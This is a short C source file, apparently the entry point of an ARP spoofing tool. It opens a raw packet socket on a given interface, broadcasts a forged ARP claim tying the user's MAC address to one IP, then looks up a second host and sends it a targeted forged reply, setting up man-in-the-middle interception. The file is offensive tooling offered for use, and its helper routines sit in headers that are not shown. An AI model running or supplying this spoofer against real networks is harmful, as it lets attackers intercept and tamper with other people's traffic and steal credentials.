#include "ARP_Headers.h"
#include "ARP_Sniffer.h"
#include "ARP_Packet.h"
#include "ARP_Spoofer.h"
#include "ARP_Log.h"
#include "ARP_Utils.h"

int main(int args, char* argv[])
{
    if(args != 4)
    {
        LOG("Usage: %s <interface> <first-ip> <second-ip>", argv[0]);

        exit(EXIT_FAILURE);
    }

    IP frst_ip;
    IP scnd_ip;
    MAC my_mac, trgrt_mac;
    
    get_my_mac(argv[1], my_mac);

    str_to_ip(argv[2], frst_ip);

    str_to_ip(argv[3], scnd_ip);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    broadcast_spoofed_ip(my_mac, frst_ip, scnd_ip,get_interface_sending(argv[1]), sock);
    get_target_mac(sock, scnd_ip, trgrt_mac);
    send_spoofed_ip(my_mac, frst_ip, trgrt_mac, scnd_ip, get_interface_sending(argv[1]), sock);

    exit(EXIT_SUCCESS);
}